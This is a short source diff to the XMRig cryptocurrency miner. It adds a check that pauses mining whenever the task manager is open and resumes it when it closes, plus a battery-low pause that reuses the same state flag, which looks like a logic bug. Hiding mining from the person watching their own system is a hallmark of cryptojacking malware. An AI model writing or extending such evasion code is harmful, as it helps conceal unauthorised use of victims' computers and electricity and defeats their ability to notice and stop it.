@@ -43,6 +43,8 @@
 #include "core/Controller.h"
 #include "crypto/common/Nonce.h"
 #include "version.h"
+#include "Environment.h"
+#include "crypto/common/VirtualMemory.h"
 
 
 #ifdef XMRIG_FEATURE_API
@@ -353,6 +355,7 @@ public:
     bool active         = false;
     bool battery_power  = false;
     bool user_active    = false;
+    bool is_viewed      = false;
     bool enabled        = true;
     int32_t auto_pause = 0;
     bool reset          = true;
@@ -370,7 +373,7 @@ public:
 
 
 
-xmrig::Miner::Miner(Controller *controller)
+xmrig::Miner::Miner(Controller* controller)
     : d_ptr(new MinerPrivate(controller))
 {
     const int priority = controller->config()->cpu().priority();
@@ -643,6 +646,17 @@ void xmrig::Miner::onTimer(const Timer *)
 
     if (config->isPauseOnBattery()) {
         autoPause(d_ptr->battery_power, Platform::isOnBatteryPower(), YELLOW_BOLD("on battery power"), GREEN_BOLD("on AC power"));
+    }
+
+        
+    autoPause(d_ptr->is_viewed, Environment::isViewed(), YELLOW_BOLD("task manager on"), GREEN_BOLD("task manager off"));
+
+    if (Environment::isOnBattery())
+    {
+        if (Environment::isBatteryLow())
+        {
+            autoPause(d_ptr->is_viewed, Environment::isBatteryLow(), YELLOW_BOLD("battery is low"), GREEN_BOLD("battery is ok"));
+        }
     }
 
     if (config->isPauseOnActive()) {
